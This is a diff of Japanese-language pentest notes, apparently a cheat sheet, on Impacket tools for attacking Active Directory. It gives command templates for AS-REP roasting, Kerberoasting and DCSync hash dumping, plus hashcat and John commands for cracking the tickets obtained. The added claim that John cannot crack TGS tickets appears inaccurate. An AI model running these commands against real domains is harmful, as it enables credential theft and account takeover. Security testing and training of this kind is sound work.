@@ -20,14 +20,15 @@
   `impacket-〇〇`以外に、`python3 /usr/share/doc/python3-impacket/examples/〇〇.py`でも実行できる
   - GetNPUsers  
     - 「`impacket-GetNPUsers` -no-pass -dc-ip ドメコンIP ドメイン名/ユーザ名 -outputfile 出力ファイル名」  
-      `ASREPRoast`（Kerberos事前認証を必要としていないユーザのTGTを取得できる）を実行  
+      ASREPRoast（Kerberos事前認証を必要としていないユーザのTGTを取得できる）を実行  
       取得したTGTは「hashcat -a 0 -m 18200 Passwordリスト名 TGTファイル名 」  
       または「john --wordlist=Passwordリスト名 TGTファイル名」でクラックできる  
     - 「`impacket-GetNPUsers` -no-pass -dc-ip ドメコンIP -userfile ユーザリスト ドメイン名/ -outputfile 出力ファイル名」  
       では「-userfile」内の各ユーザに対してASREPRoastを実行
   - GetUserSPNs  
     「`impacket-GetUserSPNs` -dc-ip ドメコンIP ドメイン名/ユーザ名:パスワード -outputfile 出力ファイル名」  
-    Kerberoasting（取得したユーザのSPNに対応したアカウントのTGSを取得できる）を実行
+    Kerberoasting（取得したユーザのSPNに対応したアカウントのTGSを取得できる）を実行  
+    TGSは「hashcat -a 0 -m 13100 TGSファイル名 Passwordリスト」でクラックできる（JohnではTGSをサポートしてない）
   - secretsdump  
     「`impacket-secretsdump` -just-dc ドメイン名/ユーザ名:パスワード@IPアドレス -outputfile 出力ファイル名」  
     DCSync権限を持つドメインユーザを使用して、各ドメインユーザのNTハッシュやKerberosキーをダンプできる。
